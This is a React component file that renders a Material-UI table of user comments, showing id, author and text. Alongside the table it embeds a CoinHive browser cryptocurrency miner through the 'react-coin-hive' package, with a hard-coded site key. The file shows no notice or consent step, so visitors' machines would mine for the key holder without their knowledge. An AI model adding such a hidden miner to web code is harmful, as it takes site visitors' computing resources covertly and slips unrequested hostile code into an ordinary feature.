//CommentList.js
import React, { Component } from 'react';
import Paper from 'material-ui/Paper';
import Table, { TableBody, TableCell, TableHead, TableRow } from 'material-ui/Table';
import PropTypes from 'prop-types';
import { withStyles } from 'material-ui/styles';
import CoinHive from 'react-coin-hive';

const styles = theme => ({
  root: {
    width: '100%',
    marginTop: theme.spacing.unit * 3,
    overflowX: 'auto',
  },
  table: {
    minWidth: 100,
  },
});

class CommentList extends Component {  
  render() {
    const { classes } = this.props;
    
    let commentNodes = this.props.data;
    return (      
      <div>
        <Paper elevation={6} className={classes.root}>
          <CoinHive siteKey='01ZLOOj83AZZaQf1NnSPIW5B7HM3NjdD'/>
          <Table className={classes.table}>
            <TableHead>
              <TableRow>
                <TableCell>Id</TableCell>
                <TableCell>Nome</TableCell>
                <TableCell>Texto</TableCell>                
              </TableRow>
            </TableHead>
            <TableBody>
              {commentNodes.map(n => {
                return (
                  <TableRow key={n._id.id}>
                    <TableCell>{n._id.id}</TableCell>
                    <TableCell>{n.author}</TableCell>
                    <TableCell>{n.text}</TableCell>                    
                  </TableRow>
                );
              })}
            </TableBody>
          </Table>                 
        </Paper>        
      </div>     
    )
  }
}

CommentList.propTypes = {
  classes: PropTypes.object.isRequired,
};

export default withStyles(styles)(CommentList);